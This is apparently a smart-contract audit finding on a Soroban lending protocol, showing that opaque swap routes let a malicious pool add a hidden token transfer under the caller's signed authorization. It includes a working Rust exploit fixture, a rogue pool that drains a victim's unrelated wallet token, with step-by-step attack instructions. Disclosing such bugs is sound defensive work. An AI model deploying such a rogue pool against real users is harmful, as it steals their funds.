### Title
Attacker-controlled strategy routes can drain unrelated caller wallet tokens through a malicious venue - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Strategy entrypoints accept caller-supplied `swap` bytes and forward them to the configured router after only authorizing the controller’s exact input-token transfer. The router decodes pool and token addresses from that payload and invokes route-selected venue contracts without an on-chain pool allowlist. A malicious venue can therefore introduce an unexpected `token.transfer(caller, attacker, amount)` under the caller’s signed authorization tree and steal unrelated wallet assets when that tree is signed. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` authorizes the caller and verifies account ownership or delegation, but treats `swap` as opaque route data and passes it into `withdraw_and_swap_from_supply`. [4](#0-3)  The shared swap helper snapshots controller balances, registers only `token_in.transfer(controller, router, amount_in)` as controller invoker auth, and then calls `router.execute_strategy(controller, amount_in, swap)`. [5](#0-4) 

Those balance checks bound the controller’s input and output, but they do not constrain authorization requests made by deeper route-selected contracts to the original account caller. [6](#0-5)  The router constructs each hop’s `pool`, `token_in`, and `token_out` from caller-controlled registry entries and dispatches the selected venue. [2](#0-1)  Venue adapters then invoke the supplied pool address; for example, Phoenix invokes `pool.swap`, while Sushi and Soroswap perform pool metadata reads and `pool.swap` calls. [7](#0-6) [8](#0-7) [9](#0-8) 

Soroban records a token transfer requiring the account caller’s authorization as a child beneath the caller’s strategy authorization, even when the token and recipient are unrelated to the lending operation. [10](#0-9)  Enforced authorization rejects the transfer if the signed tree omits that child, but executes it if the caller signs the simulated tree containing it. [11](#0-10) 

### Impact Explanation
An attacker who can supply or influence a route can attach a transfer of any token balance held by the caller, including assets never supplied to or listed by the lending protocol. [12](#0-11) [13](#0-12)  The committed exploit fixture drains Alice’s entire unrelated `WALLET_BALANCE` to the attacker while still returning a valid swap output and satisfying the controller’s settlement checks. [14](#0-13)  This is theft of user funds because the protocol’s measured input/output checks only cover the intended swap legs and do not bound additional caller-authorized transfers. [6](#0-5) 

### Likelihood Explanation
All affected strategy verbs are reachable by an ordinary account owner or active delegate, and several carry attacker-controlled `swap` bytes, including `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`. [15](#0-14)  Exploitation requires the victim to sign an authorization tree containing the unexpected child transfer, so a wallet or client that rejects extra authorization children prevents it. [11](#0-10)  The risk remains material because routes are opaque XDR and legitimate simulation naturally expands nested authorization requirements, making the extra transfer easy to miss in a generic wallet confirmation. [16](#0-15) [17](#0-16) 

### Recommendation
Maintain an on-chain allowlist of approved venue pool addresses and reject route registries containing unapproved pool contracts before dispatching hops. [2](#0-1)  Until routes are allowlisted, wallets and SDKs should simulate every strategy transaction, decode the complete authorization tree, and reject any child invocation other than the expected lending input transfers. [18](#0-17)  Add regression coverage asserting that a malicious route cannot introduce an unrelated caller-token transfer without producing a distinct, client-rejectable authorization child. [3](#0-2) 

### Proof of Concept
1. Alice owns a solvent lending account holding USDC collateral and also holds `77,770,000,000` units of an unrelated wallet token. [19](#0-18) 
2. The attacker deploys a pool-shaped contract whose `swap` entrypoint executes `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`. [13](#0-12) 
3. The attacker gives Alice a `swap_collateral(alice, account_id, USDC, 50_000_000_000, ETH, swap)` transaction whose route selects that malicious pool. [20](#0-19) 
4. Simulation records `wallet_token.transfer(alice, attacker, WALLET_BALANCE)` as a child of Alice’s `swap_collateral` authorization. [21](#0-20) 
5. If Alice signs that returned tree, the transaction succeeds, Alice’s unrelated wallet-token balance becomes zero, the attacker receives `WALLET_BALANCE`, and the intended ETH collateral credit still posts. [22](#0-21)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-166)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-22)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-100)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-157)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }

    fn assets(&self) -> (HubAssetKey, HubAssetKey) {
        (
            hub_asset(self.t.resolve_asset("USDC")),
            hub_asset(self.t.resolve_asset("ETH")),
        )
    }

    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L22-25)
```rust
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/sushi.rs (L47-50)
```rust
    ];
    let _: Val = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &Symbol::new(ctx.env, "swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L85-87)
```rust
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/controller/src/lib.rs (L255-321)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }

    /// Repays `debt` from `collateral`, netting directly for the same hub asset
    /// (`swap` must be empty) or converting otherwise. `close_position` withdraws
    /// all remaining collateral to the caller, reverting with
    /// `CannotCloseWithRemainingDebt` if any debt remains. Requires owner or
    /// delegate authorization.
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
```

**File:** interfaces/swap-aggregator/src/lib.rs (L18-21)
```rust
#[contractclient(name = "SwapAggregatorClient")]
pub trait SwapAggregatorInterface {
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128;

```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```
